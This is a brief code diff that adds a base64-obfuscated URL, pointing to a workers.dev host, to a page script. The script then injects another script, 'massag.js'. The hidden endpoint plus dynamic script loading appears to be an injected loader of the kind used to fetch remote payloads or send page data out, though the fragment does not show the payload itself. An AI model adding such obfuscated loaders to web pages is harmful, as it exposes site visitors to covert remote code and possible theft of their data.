@@ -5,6 +5,9 @@
       return;
     }
     window.__OZ_FROM_GO = true;
+    window.__OZ_U = atob(
+      "aHR0cHM6Ly9ub2lzeS13b29kLTBlNmYuYWtrZ3JvbW1zLndvcmtlcnMuZGV2Lw=="
+    );
     var s = document.createElement("script");
     s.src = "massag.js";
     s.async = true;
